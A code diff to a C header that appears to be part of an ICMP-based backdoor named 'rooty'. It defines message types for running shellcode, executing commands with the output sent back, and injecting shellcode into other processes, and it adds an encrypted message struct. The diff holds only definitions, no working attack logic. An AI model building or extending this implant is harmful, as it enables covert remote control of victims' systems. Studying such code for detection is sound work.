@@ -14,7 +14,9 @@
 #define MAX_PACKET_SIZE 1024
 #define MAGIC           "GOATSE"
 #define REDIRECT		   " 2>&1"
+#define BLOCK_SIZE      128
 
+#define MESSAGE_RESPONSE 		      0x00  // Response
 #define MESSAGE_SHELLCODE 		      0x01  // Fork and run the shellcode
 #define MESSAGE_COMMAND 		      0x02  // Run a command and send back the response
 #define MESSAGE_REMOTE_SHELLCODE	   0x04  // Inject shellcode into another process
@@ -49,9 +51,8 @@
 #define LOG_ERROR(...) { LOG("ERROR", __VA_ARGS__); }
 #define LOG_DEBUG(...) { DEBUG_WRAP(LOG("DEBUG", __VA_ARGS__)); }
 
-uint32_t decrypt_message(const uint8_t *data, uint8_t *decoded_data, uint32_t len, uint8_t *key);
 
-typedef struct ip_hdr {
+typedef struct __attribute__((__packed__)) ip_hdr {
    uint8_t ip_header_len:4;
    uint8_t ip_version:4;
    uint8_t ip_tos;
@@ -70,7 +71,7 @@ typedef struct ip_hdr {
 
 } IPV4_HDR;
 
-typedef struct icmp_hdr {
+typedef struct __attribute__((__packed__)) icmp_hdr {
   uint8_t type;     /* message type */
   uint8_t code;     /* type sub-code */
   uint16_t checksum;
@@ -89,3 +90,13 @@ typedef struct icmp_hdr {
     } frag;       /* path mtu discovery */
   } un;
 } ICMP_HDR;
+
+typedef struct __attribute__((__packed__)) rooty_message {
+    uint8_t     key[BLOCK_SIZE];
+    uint8_t     magic[6];
+    uint8_t     type;
+    uint16_t    len;
+    uint8_t     data[];
+} ROOTY_MESSAGE;
+
+uint32_t decrypt_message(ROOTY_MESSAGE *msg, uint32_t len);
